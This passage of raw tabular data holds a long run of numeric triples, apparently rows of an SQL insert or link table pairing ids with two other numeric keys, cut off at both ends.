87,142),(8475,263,142),(8476,260,142),(8477,204,142),(8478,162,142),(8479,90,142),(8480,81,142),(8481,78,142),(8482,62,142),(8483,51,142),(8484,47,142),(8485,46,142),(8486,40,142),(8487,39,142),(8488,509,223),(8489,912,223),(8490,704,223),(8491,560,223),(8492,476,223),(8493,392,223),(8494,268,223),(8495,231,223),(8496,217,223),(8497,190,223),(8498,169,223),(8499,151,223),(8500,151,223),(8501,75,223),(8502,50,223),(8503,50,223),(8504,2772,166),(8505,2760,166),(8506,2235,166),(8507,1763,166),(8508,1248,166),(8509,1074,166),(8510,1004,166),(8511,912,166),(8512,868,166),(8513,525,166),(8514,476,166),(8515,392,166),(8516,342,166),(8517,338,166),(8518,318,166),(8519,268,166),(8520,231,166),(8521,151,166),(8522,137,166),(8523,58,166),(8524,53,166),(8525,29,166),(8526,28,166),(8527,26,166),(8528,12,166),(8529,2760,175),(8530,2099,175),(8531,1763,175),(8532,1074,175),(8533,1004,175),(8534,509,175),(8535,912,175),(8536,868,175),(8537,706,175),(8538,705,175),(8539,525,175),(8540,476,175),(8541,392,175),(8542,390,175),(8543,349,175),(8544,342,175),(8545,338,175),(8546,318,175),(8547,300,175),(8548,268,175),(8549,231,175),(8550,217,175),(8551,190,175),(8552,169,175),(8553,153,175),(8554,151,175),(8555,136,175),(8556,75,175),(8557,69,175),(8558,53,175),(8559,50,175),(8560,27,175),(8561,2769,139),(8562,2413,139),(8563,2396,139),(8564,2019,139),(8565,1922,139),(8566,1552,139),(8567,1310,139),(8568,1291,139),(8569,1025,139),(8570,1011,139),(8571,509,139),(8572,784,139),(8573,557,139),(8574,494,139),(8575,477,139),(8576,451,139),(8577,387,139),(8578,264,139),(8579,263,139),(8580,258,139),(8581,241,139),(8582,216,139),(8583,131,139),(8584,90,139),(8585,89,139),(8586,79,139),(8587,78,139),(8588,67,139),(8589,66,139),(8590,52,139),(8591,51,139),(8592,40,139),(8593,39,139),(8594,37,139),(8595,31,139),(8596,22,139),(8597,17,139),(8598,2772,174),(8599,2760,174),(8600,2574,174),(8601,2099,174),(8602,1922,174),(8603,1763,174),(8604,1732,174),(8605,1413,174),(8606,1248,174),(8607,1074,174),(8608,1031,174),(8609,1004,174),(8610,509,174),(8611,891,174),(8612,868,174),(8613,819,174),(8614,706,174),(8615,705,174),(8616,779,174),(8617,771,174),(8618,724,174),(8619,560,174),(8620,525,174),(8621,476,174),(8622,392,174),(8623,390,174),(8624,349,174),(8625,342,174),(8626,338,174),(8627,318,174),(8628,300,174),(8629,268,174),(8630,231,174),(8631,217,174),(8632,209,174),(8633,190,174),(8634,153,174),(8635,151,174),(8636,136,174),(8637,75,174),(8638,69,174),(8639,60,174),(8640,53,174),(8641,50,174),(8642,41,174),(8643,33,174),(8644,29,174),(8645,1,174),(8646,2760,212),(8647,2099,212),(8648,1763,212),(8649,1248,212),(8650,1074,212),(8651,1004,212),(8652,509,212),(8653,876,212),(8654,525,212),(8655,476,212),(8656,392,212),(8657,342,212),(8658,338,212),(8659,300,212),(8660,231,212),(8661,206,212),(8662,190,212),(8663,151,212),(8664,136,212),(8665,75,212),(8666,53,212),(8667,50,212),(8668,2772,163),(8669,2760,163),(8670,2108,163),(8671,2099,163),(8672,1922,163),(8673,1486,163),(8674,1248,163),(8675,1074,163),(8676,1031,163),(8677,1004,163),(8678,891,163),(8679,779,163),(8680,771,163),(8681,476,163),(8682,390,163),(8683,349,163),(8684,318,163),(8685,300,163),(8686,88,163),(8687,60,163),(8688,53,163),(8689,20,163),(8690,2923,137),(8691,2784,137),(8692,2769,137),(8693,2446,137),(8694,2396,137),(8695,2149,137),(8696,2133,137),(8697,2108,137),(8698,2000,137),(8699,1833,137),(8700,1832,137),(8701,1816,137),(8702,1636,137),(8703,1552,137),(8704,1481,137),(8705,1380,137),(8706,1323,137),(8707,1310,137),(8708,1227,137),(8709,1122,137),(8710,1291,137),(8711,1009,137),(8712,793,137),(8713,739,137),(8714,674,137),(8715,670,137),(8716,532,137),(8717,523,137),(8718,506,137),(8719,477,137),(8720,451,137),(8721,387,137),(8722,350,137),(8723,252,137),(8724,216,137),(8725,155,137),(8726,154,137),(8727,90,137),(8728,89,137),(8729,81,137),(8730,79,137),(8731,78,137),(8732,62,137),(8733,60,137),(8734,51,137),(8735,47,137),(8736,46,137),(8737,40,137),(8738,37,137),(8739,36,137),(8740,29,137),(8741,22,137),(8742,20,137),(8743,17,137),(8744,2760,219),(8745,1763,219),(8746,1248,219),(8747,1004,219),(8748,509,219),(8749,876,219),(8750,392,219),(8751,349,219),(8752,342,219),(8753,231,219),(8754,206,219),(8755,190,219),(8756,151,219),(8757,136,219),(8758,75,219),(8759,50,219),(8760,33,219),(8761,2894,134),(8762,2469,134),(8763,2460,134),(8764,2433,134),(8765,2235,134),(8766,1552,134),(8767,1310,134),(8768,1099,134),(8769,1011,134),(8770,470,134),(8771,540,134),(8772,494,134),(8773,483,134),(8774,477,134),(8775,342,134),(8776,264,134),(8777,231,134),(8778,216,134),(8779,190,134),(8780,164,134),(8781,162,134),(8782,131,134),(8783,90,134),(8784,78,134),(8785,69,134),(8786,47,134),(8787,46,134),(8788,40,134),(8789,39,134),(8790,37,134),(8791,34,134),(8792,22,134),(8793,2966,130),(8794,1552,130),(8795,1539,130),(8796,1310,130),(8797,1283,130),(8798,1291,130),(8799,1213,130),(8800,1150,130),(8801,1099,130),(8802,1064,130),(8803,1011,130),(8804,744,130),(8805,477,130),(8806,451,130),(8807,387,130),(8808,90,130),(8809,78,130),(8810,51,130),(8811,49,130),(8812,47,130),(8813,40,130),(8814,29,130),(8815,2894,198),(8816,2760,198),(8817,2769,198),(8818,2089,198),(8819,1763,198),(8820,1248,198),(8821,1074,198),(8822,1031,198),(8823,1004,198),(8824,771,198),(8825,728,198),(8826,525,198),(8827,392,198),(8828,342,198),(8829,338,198),(8830,263,198),(8831,231,198),(8832,217,198),(8833,190,198),(8834,153,198),(8835,151,198),(8836,136,198),(8837,75,198),(8838,69,198),(8839,53,198),(8840,50,198),(8841,1,198),(8842,2760,208),(8843,1763,208),(8844,1074,208),(8845,509,208),(8846,912,208),(8847,868,208),(8848,705,208),(8849,525,208),(8850,476,208),(8851,392,208),(8852,390,208),(8853,349,208),(8854,342,208),(8855,338,208),(8856,300,208),(8857,268,208),(8858,231,208),(8859,217,208),(8860,190,208),(8861,169,208),(8862,151,208),(8863,136,208),(8864,75,208),(8865,53,208),(8866,50,208),(8867,29,208),(8868,27,208),(8869,2772,160),(8870,2760,160),(8871,2099,160),(8872,1763,160),(8873,1248,160),(8874,1074,160),(8875,1004,160),(8876,509,160),(8877,525,160),(8878,392,160),(8879,349,160),(8880,342,160),(8881,300,160),(8882,231,160),(8883,151,160),(8884,53,160),(8885,50,160),(8886,2574,128),(8887,2485,128),(8888,2278,128),(8889,2206,128),(8890,2149,128),(8891,2108,128),(8892,1991,128),(8893,1816,128),(8894,1732,128),(8895,1552,128),(8896,1539,128),(8897,1486,128),(8898,1310,128),(8899,2229,128),(8900,1426,128),(8901,2225,128),(8902,1133,128),(8903,1134,128),(8904,1118,128),(8905,1099,128),(8906,1011,128),(8907,760,128),(8908,693,128),(8909,540,128),(8910,496,128),(8911,486,128),(8912,477,128),(8913,461,128),(8914,451,128),(8915,414,128),(8916,392,128),(8917,387,128),(8918,342,128),(8919,338,128),(8920,326,128),(8921,303,128),(8922,266,128),(8923,264,128),(8924,263,128),(8925,246,128),(8926,243,128),(8927,216,128),(8928,205,128),(8929,204,128),(8930,151,128),(8931,90,128),(8932,89,128),(8933,79,128),(8934,78,128),(8935,77,128),(8936,60,128),(8937,54,128),(8938,52,128),(8939,51,128),(8940,49,128),(8941,47,128),(8942,46,128),(8943,40,128),(8944,39,128),(8945,37,128),(8946,22,128),(8947,17,128),(8948,2760,202),(8949,2149,202),(8950,2108,202),(8951,2089,202),(8952,2099,202),(8953,1922,202),(8954,1763,202),(8955,1283,202),(8956,1248,202),(8957,1300,202),(8958,1074,202),(8959,1031,202),(8960,1004,202),(8961,509,202),(8962,912,202),(8963,891,202),(8964,868,202),(8965,819,202),(8966,706,202),(8967,705,202),(8968,779,202),(8969,771,202),(8970,525,202),(8971,476,202),(8972,390,202),(8973,349,202),(8974,342,202),(8975,326,202),(8976,300,202),(8977,252,202),(8978,231,202),(8979,206,202),(8980,152,202),(8981,151,202),(8982,69,202),(8983,50,202),(8984,49,202),(8985,2965,145),(8986,2951,145),(8987,2956,145),(8988,2798,145),(8989,2278,145),(8990,2149,145),(8991,2108,145),(8992,1991,145),(8993,1920,145),(8994,1844,145),(8995,1816,145),(8996,1748,145),(8997,1552,145),(8998,1310,145),(8999,2229,145),(9000,2215,145),(9001,1426,145),(9002,1089,145),(9003,1228,145),(9004,1196,145),(9005,1150,145),(9006,1133,145),(9007,1134,145),(9008,1119,145),(9009,1085,145),(9010,1011,145),(9011,884,145),(9012,470,145),(9013,836,145),(9014,784,145),(9015,768,145),(9016,760,145),(9017,734,145),(9018,724,145),(9019,693,145),(9020,540,145),(9021,486,145),(9022,477,145),(9023,461,145),(9024,451,145),(9025,448,145),(9026,422,145),(9027,414,145),(9028,392,145),(9029,342,145),(9030,326,145),(9031,287,145),(9032,264,145),(9033,263,145),(9034,246,145),(9035,231,145),(9036,216,145),(9037,168,145),(9038,162,145),(9039,151,145),(9040,90,145),(9041,79,145),(9042,78,145),(9043,77,145),(9044,52,145),(9045,51,145),(9046,47,145),(9047,46,145),(9048,40,145),(9049,39,145),(9050,37,145),(9051,22,145),(9052,17,145),(9053,2760,240),(9054,2149,240),(9055,2108,240),(9056,2099,240),(9057,1922,240),(9058,1248,240),(9059,1002,240),(9060,509,240),(9061,819,240),(9062,706,240),(9063,779,240),(9064,771,240),(9065,647,240),(9066,525,240),(9067,451,240),(9068,392,240),(9069,387,240),(9070,349,240),(9071,342,240),(9072,300,240),(9073,234,240),(9074,231,240),(9075,219,240),(9076,206,240),(9077,151,240),(9078,75,240),(9079,53,240),(9080,50,240),(9081,20,240),(9082,14,240),(9083,13,240),(9084,7,240),(9085,3,240),(9086,2772,179),(9087,2760,179),(9088,2099,179),(9089,1763,179),(9090,1004,179),(9091,509,179),(9092,912,179),(9093,868,179),(9094,706,179),(9095,705,179),(9096,392,179),(9097,342,179),(9098,338,179),(9099,268,179),(9100,231,179),(9101,217,179),(9102,169,179),(9103,151,179),(9104,136,179),(9105,75,179),(9106,69,179),(9107,53,179),(9108,50,179),(9109,29,179),(9110,27,179),(9111,9,179),(9112,2772,228),(9113,2760,228),(9114,2586,228),(9115,1763,228),(9116,1662,228),(9117,1248,228),(9118,1074,228),(9119,1004,228),(9120,509,228),(9121,905,228),(9122,476,228),(9123,392,228),(9124,349,228),(9125,344,228),(9126,342,228),(9127,338,228),(9128,300,228),(9129,231,228),(9130,217,228),(9131,209,228),(9132,202,228),(9133,151,228),(9134,75,228),(9135,58,228),(9136,53,228),(9137,50,228),(9138,29,228),(9139,7,228),(9140,2965,141),(9141,2784,141),(9142,2733,141),(9143,2652,141),(9144,2643,141),(9145,2614,141),(9146,2404,141),(9147,2133,141),(9148,2108,141),(9149,2000,141),(9150,1913,141),(9151,1752,141),(9152,1636,141),(9153,1552,141),(9154,1464,141),(9155,1323,141),(9156,1310,141),(9157,1011,141),(9158,509,141),(9159,888,141),(9160,793,141),(9161,784,141),(9162,766,141),(9163,647,141),(9164,540,141),(9165,532,141),(9166,494,141),(9167,477,141),(9168,476,141),(9169,451,141),(9170,387,141),(9171,350,141),(9172,349,141),(9173,278,141),(9174,266,141),(9175,216,141),(9176,172,141),(9177,162,141),(9178,154,141),(9179,90,141),(9180,81,141),(9181,79,141),(9182,78,141),(9183,77,141),(9184,60,141),(9185,58,141),(9186,52,141),(9187,51,141),(9188,49,141),(9189,47,141),(9190,46,141),(9191,40,141),(9192,39,141),(9193,37,141),(9194,36,141),(9195,22,141),(9196,20,141),(9197,17,141),(9198,2966,129),(9199,2865,129),(9200,2600,129),(9201,2544,129),(9202,2535,129),(9203,1662,129),(9204,1552,129),(9205,1310,129),(9206,1185,129),(9207,1119,129),(9208,1085,129),(9209,1011,129),(9210,989,129),(9211,793,129),(9212,540,129),(9213,477,129),(9214,461,129),(9215,414,129),(9216,387,129),(9217,345,129),(9218,287,129),(9219,264,129),(9220,263,129),(9221,258,129),(9222,231,129),(9223,150,129),(9224,121,129),(9225,46,129),(9226,34,129),(9227,2149,141),(9228,2760,183),(9229,2099,183),(9230,1922,183),(9231,1763,183),(9232,1552,183),(9233,1248,183),(9234,1201,183),(9235,1031,183),(9236,1004,183),(9237,1002,183),(9238,509,183),(9239,891,183),(9240,868,183),(9241,706,183),(9242,705,183),(9243,779,183),(9244,771,183),(9245,525,183),(9246,476,183),(9247,392,183),(9248,390,183),(9249,342,183),(9250,338,183),(9251,300,183),(9252,268,183),(9253,263,183),(9254,240,183),(9255,231,183),(9256,179,183),(9257,151,183),(9258,69,183),(9259,53,183),(9260,50,183),(9261,29,183),(9262,2772,190),(9263,2760,190),(9264,1763,190),(9265,1248,190),(9266,1074,190),(9267,1004,190),(9268,509,190),(9269,876,190),(9270,392,190),(9271,390,190),(9272,231,190),(9273,151,190),(9274,75,190),(9275,53,190),(9276,50,190),(9277,2769,148),(9278,2418,148),(9279,2413,148),(9280,2396,148),(9281,2341,148),(9282,2108,148),(9283,2064,148),(9284,1941,148),(9285,1859,148),(9286,1796,148),(9287,1552,148),(9288,1356,148),(9289,1310,148),(9290,2215,148),(9291,2226,148),(9292,1122,148),(9293,1108,148),(9294,1119,148),(9295,1064,148),(9296,1011,148),(9297,509,148),(9298,709,148),(9299,647,148),(9300,540,148),(9301,507,148),(9302,477,148),(9303,476,148),(9304,461,148),(9305,451,148),(9306,448,148),(9307,442,148),(9308,392,148),(9309,387,148),(9310,263,148),(9311,231,148),(9312,216,148),(9313,137,148),(9314,90,148),(9315,78,148),(9316,77,148),(9317,70,148),(9318,47,148),(9319,40,148),(9320,39,148),(9321,13,148),(9322,5,148),(9323,2965,138),(9324,2951,138),(9325,2923,138),(9326,2784,138),(9327,2643,138),(9328,2387,138),(9329,2396,138),(9330,2373,138),(9331,2149,138),(9332,1552,138),(9333,1391,138),(9334,1380,138),(9335,1337,138),(9336,1310,138),(9337,1025,138),(9338,1011,138),(9339,1010,138),(9340,509,138),(9341,793,138),(9342,784,138),(9343,739,138),(9344,557,138),(9345,540,138),(9346,494,138),(9347,483,138),(9348,477,138),(9349,451,138),(9350,392,138),(9351,387,138),(9352,350,138),(9353,342,138),(9354,326,138),(9355,232,138),(9356,231,138),(9357,222,138),(9358,216,138),(9359,209,138),(9360,203,138),(9361,162,138),(9362,154,138),(9363,150,138),(9364,131,138),(9365,90,138),(9366,89,138),(9367,81,138),(9368,79,138),(9369,78,138),(9370,77,138),(9371,60,138),(9372,52,138),(9373,51,138),(9374,50,138),(9375,47,138),(9376,46,138),(9377,40,138),(9378,39,138),(9379,37,138),(9380,29,138),(9381,22,138),(9382,21,138),(9383,20,138),(9384,17,138),(9385,2,138),(9386,2772,172),(9387,2760,172),(9388,2469,172),(9389,2235,172),(9390,1763,172),(9391,1470,172),(9392,1248,172),(9393,1074,172),(9394,1009,172),(9395,1004,172),(9396,912,172),(9397,868,172),(9398,476,172),(9399,392,172),(9400,349,172),(9401,342,172),(9402,338,172),(9403,318,172),(9404,268,172),(9405,260,172),(9406,258,172),(9407,231,172),(9408,151,172),(9409,137,172),(9410,58,172),(9411,53,172),(9412,50,172),(9413,29,172),(9414,21,172),(9415,7,172),(9416,2760,186),(9417,2099,186),(9418,1922,186),(9419,1031,186),(9420,1004,186),(9421,509,186),(9422,779,186),(9423,771,186),(9424,525,186),(9425,487,186),(9426,485,186),(9427,476,186),(9428,390,186),(9429,342,186),(9430,326,186),(9431,318,186),(9432,300,186),(9433,231,186),(9434,151,186),(9435,53,186),(9436,50,186),(9437,43,186),(9438,29,186),(9439,14,186),(9440,9,186),(9441,2772,181),(9442,2760,181),(9443,2011,181),(9444,2000,181),(9445,1763,181),(9446,1470,181),(9447,1431,181),(9448,1248,181),(9449,1009,181),(9450,1004,181),(9451,977,181),(9452,509,181),(9453,868,181),(9454,832,181),(9455,779,181),(9456,771,181),(9457,525,181),(9458,476,181),(9459,392,181),(9460,390,181),(9461,349,181),(9462,342,181),(9463,338,181),(9464,326,181),(9465,318,181),(9466,300,181),(9467,292,181),(9468,268,181),(9469,231,181),(9470,217,181),(9471,206,181),(9472,190,181),(9473,169,181),(9474,153,181),(9475,151,181),(9476,136,181),(9477,88,181),(9478,75,181),(9479,53,181),(9480,33,181),(9481,29,181),(9482,27,181),(9483,21,181),(9484,20,181),(9485,9,181),(9486,2772,184),(9487,2760,184),(9488,2574,184),(9489,2099,184),(9490,1854,184),(9491,1763,184),(9492,1732,184),(9493,1413,184),(9494,1248,184),(9495,1004,184),(9496,509,184),(9497,876,184),(9498,868,184),(9499,724,184),(9500,560,184),(9501,476,184),(9502,464,184),(9503,392,184),(9504,390,184),(9505,349,184),(9506,342,184),(9507,338,184),(9508,318,184),(9509,231,184),(9510,217,184),(9511,209,184),(9512,206,184),(9513,190,184),(9514,169,184),(9515,153,184),(9516,151,184),(9517,137,184),(9518,136,184),(9519,75,184),(9520,69,184),(9521,53,184),(9522,50,184),(9523,29,184),(9524,21,184),(9525,2772,177),(9526,2760,177),(9527,2099,177),(9528,1816,177),(9529,1763,177),(9530,1283,177),(9531,1004,177),(9532,509,177),(9533,912,177),(9534,876,177),(9535,875,177),(9536,819,177),(9537,525,177),(9538,476,177),(9539,392,177),(9540,344,177),(9541,338,177),(9542,268,177),(9543,217,177),(9544,169,177),(9545,151,177),(9546,137,177),(9547,136,177),(9548,75,177),(9549,69,177),(9550,53,177),(9551,35,177),(9552,29,177),(9553,2760,157),(9554,509,157),(9555,560,157),(9556,392,157),(9557,342,157),(9558,268,157),(9559,231,157),(9560,217,157),(9561,209,157),(9562,169,157),(9563,151,157),(9564,136,157),(9565,75,157),(9566,50,157),(9567,2760,164),(9568,2099,164),(9569,1922,164),(9570,1780,164),(9571,1763,164),(9572,1248,164),(9573,1074,164),(9574,1031,164),(9575,1004,164),(9576,891,164),(9577,819,164),(9578,706,164),(9579,705,164),(9580,779,164),(9581,771,164),(9582,525,164),(9583,476,164),(9584,392,164),(9585,390,164),(9586,349,164),(9587,342,164),(9588,326,164),(9589,318,164),(9590,300,164),(9591,268,164),(9592,231,164),(9593,202,164),(9594,151,164),(9595,53,164),(9596,50,164),(9597,21,164),(9598,2772,193),(9599,2760,193),(9600,2149,193),(9601,2108,193),(9602,1816,193),(9603,1763,193),(9604,1486,193),(9605,509,193),(9606,912,193),(9607,560,193),(9608,476,193),(9609,392,193),(9610,342,193),(9611,231,193),(9612,151,193),(9613,50,193),(9614,2894,217),(9615,2772,217),(9616,2652,217),(9617,2574,217),(9618,2469,217),(9619,2418,217),(9620,2235,217),(9621,1732,217),(9622,1662,217),(9623,1413,217),(9624,1365,217),(9625,1342,217),(9626,1281,217),(9627,1004,217),(9628,509,217),(9629,912,217),(9630,709,217),(9631,724,217),(9632,643,217),(9633,560,217),(9634,507,217),(9635,392,217),(9636,387,217),(9637,342,217),(9638,326,217),(9639,268,217),(9640,231,217),(9641,217,217),(9642,209,217),(9643,169,217),(9644,151,217),(9645,75,217),(9646,69,217),(9647,53,217),(9648,50,217),(9649,9,217),(9650,7,217),(9651,1,217),(9652,2760,195),(9653,2099,195),(9654,1763,195),(9655,1248,195),(9656,1300,195),(9657,1004,195),(9658,509,195),(9659,876,195),(9660,868,195),(9661,779,195),(9662,771,195),(9663,525,195),(9664,476,195),(9665,392,195),(9666,390,195),(9667,349,195),(9668,338,195),(9669,318,195),(9670,300,195),(9671,268,195),(9672,231,195),(9673,217,195),(9674,206,195),(9675,202,195),(9676,190,195),(9677,169,195),(9678,151,195),(9679,136,195),(9680,75,195),(9681,69,195),(9682,60,195),(9683,53,195),(9684,50,195),(9685,29,195),(9686,27,195),(9687,2772,197),(9688,2760,197),(9689,2099,197),(9690,1763,197),(9691,1248,197),(9692,1074,197),(9693,1009,197),(9694,1004,197),(9695,509,197),(9696,912,197),(9697,876,197),(9698,868,197),(9699,706,197),(9700,705,197),(9701,771,197),(9702,525,197),(9703,476,197),(9704,392,197),(9705,390,197),(9706,349,197),(9707,338,197),(9708,300,197),(9709,268,197),(9710,231,197),(9711,217,197),(9712,209,197),(9713,206,197),(9714,190,197),(9715,169,197),(9716,151,197),(9717,137,197),(9718,136,197),(9719,75,197),(9720,58,197),(9721,53,197),(9722,50,197),(9723,29,197),(9724,27,197),(9725,21,197),(9726,2760,237),(9727,2469,237),(9728,2099,237),(9729,1763,237),(9730,1486,237),(9731,1248,237),(9732,1074,237),(9733,1134,237),(9734,1004,237),(9735,1002,237),(9736,509,237),(9737,912,237),(9738,819,237),(9739,706,237),(9740,705,237),(9741,771,237),(9742,728,237),(9743,507,237),(9744,476,237),(9745,390,237),(9746,342,237),(9747,300,237),(9748,268,237),(9749,263,237),(9750,179,237),(9751,151,237),(9752,69,237),(9753,53,237),(9754,21,237),(9755,2772,206),(9756,2760,206),(9757,1763,206),(9758,1248,206),(9759,1074,206),(9760,1004,206),(9761,509,206),(9762,779,206),(9763,560,206),(9764,392,206),(9765,342,206),(9766,231,206),(9767,209,206),(9768,190,206),(9769,153,206),(9770,151,206),(9771,136,206),(9772,75,206),(9773,53,206),(9774,50,206),(9775,92,202),(9776,28,202),(9777,21,202),(9778,20,202),(9779,5,202),(9780,2108,135),(9781,2089,135),(9782,1552,135),(9783,1356,135),(9784,1310,135),(9785,1291,135),(9786,1043,135),(9787,1011,135),(9788,1009,135),(9789,888,135),(9790,784,135),(9791,647,135),(9792,477,135),(9793,389,135),(9794,387,135),(9795,349,135),(9796,342,135),(9797,231,135),(9798,90,135),(9799,89,135),(9800,78,135),(9801,69,135),(9802,67,135),(9803,51,135),(9804,48,135),(9805,47,135),(9806,46,135),(9807,40,135),(9808,39,135),(9809,37,135),(9810,36,135),(9811,29,135),(9812,22,135),(9813,17,135),(9814,2942,140),(9815,2798,140),(9816,2149,140),(9817,2108,140),(9818,1470,140),(9819,1431,140),(9820,1310,140),(9821,1133,140),(9822,477,140),(9823,387,140),(9824,90,140),(9825,69,140),(9826,49,140),(9827,39,140),(9828,29,140),(9829,2894,242),(9830,2772,242),(9831,2760,242),(9832,2652,242),(9833,2535,242),(9834,2520,242),(9835,2413,242),(9836,2235,242),(9837,1763,242),(9838,1283,242),(9839,1281,242),(9840,1248,242),(9841,1213,242),(9842,1074,242),(9843,1004,242),(9844,509,242),(9845,868,242),(9846,525,242),(9847,392,242),(9848,349,242),(9849,342,242),(9850,300,242),(9851,151,242),(9852,69,242),(9853,53,242),(9854,50,242),(9855,29,242),(9856,9,242),(9857,1763,170),(9858,509,170),(9859,779,170),(9860,560,170),(9861,392,170),(9862,390,170),(9863,349,170),(9864,342,170),(9865,268,170),(9866,231,170),(9867,217,170),(9868,209,170),(9869,189,170),(9870,169,170),(9871,151,170),(9872,136,170),(9873,88,170),(9874,75,170),(9875,69,170),(9876,53,170),(9877,50,170),(9878,27,170),(9879,26,170),(9880,9,170),(9881,2221,173),(9882,2108,173),(9883,2099,173),(9884,1768,173),(9885,1763,173),(9886,1248,173),(9887,1002,173),(9888,509,173),(9889,868,173),(9890,819,173),(9891,2760,199),(9892,704,173),(9893,771,173),(9894,560,173),(9895,540,173),(9896,392,173),(9897,2221,199),(9898,349,173),(9899,342,173),(9900,300,173),(9901,2108,199),(9902,231,173),(9903,169,173),(9904,151,173),(9905,136,173),(9906,88,173),(9907,75,173),(9908,50,173),(9909,1763,199),(9910,34,173),(9911,1,173),(9912,1002,199),(9913,509,199),(9914,819,199),(9915,704,199),(9916,771,199),(9917,560,199),(9918,342,199),(9919,231,199),(9920,209,199),(9921,169,199),(9922,136,199),(9923,69,199),(9924,53,199),(9925,50,199),(9926,34,199),(9927,2772,218),(9928,2760,218),(9929,1763,218),(9930,1248,218),(9931,1074,218),(9932,1004,218),(9933,509,218),(9934,876,218),(9935,868,218),(9936,705,218),(9937,525,218),(9938,476,218),(9939,392,218),(9940,390,218),(9941,349,218),(9942,342,218),(9943,338,218),(9944,300,218),(9945,231,218),(9946,209,218),(9947,151,218),(9948,75,218),(9949,53,218),(9950,50,218),(9951,21,218),(9952,2772,176),(9953,2760,176),(9954,2099,176),(9955,1248,176),(9956,1074,176),(9957,1004,176),(9958,509,176),(9959,876,176),(9960,706,176),(9961,705,176),(9962,771,176),(9963,392,176),(9964,390,176),(9965,342,176),(9966,338,176),(9967,231,176),(9968,217,176),(9969,209,176),(9970,206,176),(9971,190,176),(9972,151,176),(9973,136,176),(9974,75,176),(9975,53,176),(9976,50,176),(9977,21,176),(9978,2772,235),(9979,2760,235),(9980,1763,235),(9981,1248,235),(9982,1074,235),(9983,1004,235),(9984,509,235),(9985,706,235),(9986,705,235),(9987,560,235),(9988,392,235),(9989,300,235),(9990,209,235),(9991,190,235),(9992,151,235),(9993,136,235),(9994,75,235),(9995,53,235),(9996,50,235),(9997,29,235),(9998,1,235),(9999,2772,248),(10000,2206,248),(10001,1979,248),(10002,1732,248),(10003,1672,248),(10004,1572,248),(10005,1512,248),(10006,1480,248),(10007,1413,248),(10008,1351,248),(10009,1248,248),(10010,1207,248),(10011,1074,248),(10012,509,248),(10013,867,248),(10014,766,248),(10015,724,248),(10016,560,248),(10017,442,248),(10018,378,248),(10019,344,248),(10020,287,248),(10021,209,248),(10022,162,248),(10023,75,248),(10024,73,248),(10025,59,248),(10026,1,248),(10027,2894,250),(10028,2206,250),(10029,2177,250),(10030,2011,250),(10031,1984,250),(10032,1979,250),(10033,1968,250),(10034,1838,250),(10035,1732,250),(10036,1672,250),(10037,1572,250),(10038,1512,250),(10039,1480,250),(10040,1413,250),(10041,1351,250),(10042,1343,250),(10043,977,250),(10044,509,250),(10045,912,250),(10046,881,250),(10047,876,250),(10048,867,250),(10049,852,250),(10050,706,250),(10051,705,250),(10052,704,250),(10053,771,250),(10054,766,250),(10055,724,250),(10056,665,250),(10057,560,250),(10058,540,250),(10059,476,250),(10060,463,250),(10061,442,250),(10062,441,250),(10063,378,250),(10064,374,250),(10065,367,250),(10066,349,250),(10067,344,250),(10068,338,250),(10069,287,250),(10070,283,250),(10071,268,250),(10072,242,250),(10073,231,250),(10074,219,250),(10075,217,250),(10076,215,250),(10077,209,250),(10078,206,250),(10079,205,250),(10080,191,250),(10081,169,250),(10082,167,250),(10083,162,250),(10084,153,250),(10085,136,250),(10086,128,250),(10087,125,250),(10088,122,250),(10089,75,250),(10090,74,250),(10091,73,250),(10092,70,250),(10093,53,250),(10094,48,250),(10095,42,250),(10096,41,250),(10097,35,250),(10098,34,250),(10099,33,250),(10100,28,250),(10101,27,250),(10102,26,250),(10103,15,250),(10104,9,250),(10105,4,250),(10106,1,250),(10107,2099,167),(10108,1922,167),(10109,1486,167),(10110,1413,167),(10111,1300,167),(10112,509,167),(10113,905,167),(10114,876,167),(10115,868,167),(10116,779,167),(10117,560,167),(10118,476,167),(10119,392,167),(10120,390,167),(10121,349,167),(10122,342,167),(10123,326,167),(10124,300,167),(10125,263,167),(10126,231,167),(10127,209,167),(10128,190,167),(10129,151,167),(10130,75,167),(10131,60,167),(10132,53,167),(10133,50,167),(10134,29,167),(10135,1,167),(10136,2772,233),(10137,2760,233),(10138,2099,233),(10139,1922,233),(10140,1763,233),(10141,1248,233),(10142,1074,233),(10143,1031,233),(10144,1004,233),(10145,509,233),(10146,891,233),(10147,819,233),(10148,706,233),(10149,705,233),(10150,779,233),(10151,771,233),(10152,525,233),(10153,390,233),(10154,349,233),(10155,342,233),(10156,300,233),(10157,231,233),(10158,151,233),(10159,50,233),(10160,21,233),(10161,2772,227),(10162,2760,227),(10163,2441,227),(10164,2367,227),(10165,2006,227),(10166,1732,227),(10167,1413,227),(10168,1248,227),(10169,1074,227),(10170,1004,227),(10171,509,227),(10172,704,227),(10173,771,227),(10174,392,227),(10175,390,227),(10176,342,227),(10177,240,227),(10178,231,227),(10179,209,227),(10180,136,227),(10181,75,227),(10182,74,227),(10183,69,227),(10184,53,227),(10185,35,227),(10186,21,227),(10187,1,227),(10188,819,175),(10189,771,175),(10190,21,175),(10191,2011,185),(10192,1922,185),(10193,1486,185),(10194,1470,185),(10195,1342,185),(10196,1248,185),(10197,1074,185),(10198,1004,185),(10199,1002,185),(10200,509,185),(10201,912,185),(10202,876,185),(10203,832,185),(10204,819,185),(10205,771,185),(10206,476,185),(10207,392,185),(10208,349,185),(10209,342,185),(10210,338,185),(10211,326,185),(10212,300,185),(10213,268,185),(10214,231,185),(10215,217,185),(10216,206,185),(10217,190,185),(10218,169,185),(10219,162,185),(10220,153,185),(10221,151,185),(10222,136,185),(10223,75,185),(10224,69,185),(10225,53,185),(10226,50,185),(10227,33,185),(10228,27,185),(10229,21,185),(10230,1,185),(10231,1763,156),(10232,1487,156),(10233,2269,156),(10234,1290,156),(10235,1248,156),(10236,1004,156),(10237,912,156),(10238,819,156),(10239,706,156),(10240,705,156),(10241,485,156),(10242,390,156),(10243,342,156),(10244,326,156),(10245,300,156),(10246,231,156),(10247,190,156),(10248,179,156),(10249,151,156),(10250,141,156),(10251,75,156),(10252,53,156),(10253,50,156),(10254,21,156),(10255,19,156),(10256,2149,139),(10257,2108,139),(10258,1481,139),(10259,209,139),(10260,81,139),(10261,5,139),(10262,2824,165),(10263,2772,165),(10264,2760,165),(10265,2099,165),(10266,1763,165),(10267,1552,165),(10268,1539,165),(10269,1283,165),(10270,1248,165),(10271,1201,165),(10272,1074,165),(10273,1031,165),(10274,1004,165),(10275,509,165),(10276,912,165),(10277,888,165),(10278,819,165),(10279,706,165),(10280,705,165),(10281,771,165),(10282,560,165),(1028